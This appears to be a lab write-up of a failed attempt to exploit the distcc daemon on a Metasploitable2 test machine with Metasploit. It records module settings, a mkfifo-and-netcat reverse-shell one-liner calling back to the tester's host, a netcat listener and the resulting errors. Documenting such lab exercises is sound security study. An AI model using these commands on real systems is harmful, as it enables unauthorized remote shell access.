#  Failed Exploit Attempt: distcc Daemon Remote Command Execution

# Target
- **Service**: distccd (Distributed Compiler Daemon)
- **Port**: 3632/tcp
- **Host**: 192.168.6.3 (Metasploitable2)

# Objective
Attempt to achieve remote code execution via the `distcc_exec` exploit by leveraging insecure command execution in the distccd daemon.

# Tool Used
- **Metasploit Framework**
  - Module: `exploit/unix/misc/distcc_exec`
  - Payloads attempted:
    - `cmd/unix/reverse_bash`
    - Manual reverse shells with custom `CMD` strings

# Exploit Steps Attempted

1. **Initial Setup:**
   ```bash
   use exploit/unix/misc/distcc_exec
   set RHOSTS 192.168.6.3
   set LHOST 192.168.6.4
   set LPORT 4444

2. Default Payload Attempt:

Used cmd/unix/reverse_bash (default)

Result: Exploit completed, but no session was created

3. Custom CMD Payloads Attempted:

set CMD "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.6.4 4999 >/tmp/f"

Reverse Listener set up: 

nc -lvnp 4999

Result: Listener timed out; exploit failed to trigger shell

4. Netcat-based Reverse Shell Attempts:

Multiple payloads using nc -e /bin/sh ... failed to trigger connection

Metasploit errors included:

Unknown datastore option: CMD

Handler failed to bind

Exploit completed, but no session was created

# Observations

Port 3632 was open and distccd was responsive.

Commands reached the target but did not execute successfully.

Netcat and Bash shell reverse commands returned:

bash: /dev/tcp/192.168.6.4/XXXX: No such file or directory

Possible missing /dev/tcp support or filtered traffic
